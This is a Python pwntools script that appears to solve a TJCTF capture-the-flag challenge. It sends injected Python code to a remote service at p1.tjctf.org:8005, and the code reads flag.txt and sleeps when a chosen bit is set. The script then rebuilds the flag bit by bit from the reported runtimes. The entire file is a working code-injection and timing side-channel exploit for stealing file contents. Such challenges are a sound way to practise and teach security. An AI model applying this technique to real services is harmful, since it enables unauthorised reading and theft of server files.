from pwn import *

p = remote("p1.tjctf.org",8005)
flag = 'tjctf{'
index = 6
while(1):
	temp = ''
	for i in range(7):
		p.sendlineafter("!\n","if bin(ord(open('flag.txt','r').read(100)[{}]))[2:].zfill(7)[{}]=='1':time.sleep(0.2)".format(index,i))
		p.recvuntil("Runtime: ")
		time = p.recvuntil("\n")[:-1]
		if float(time) > 0.2:
			temp += '1'
		else:
			temp += '0'
	index += 1
	flag += chr(int(temp,2))
	print flag
# p.close()
# p.interactive()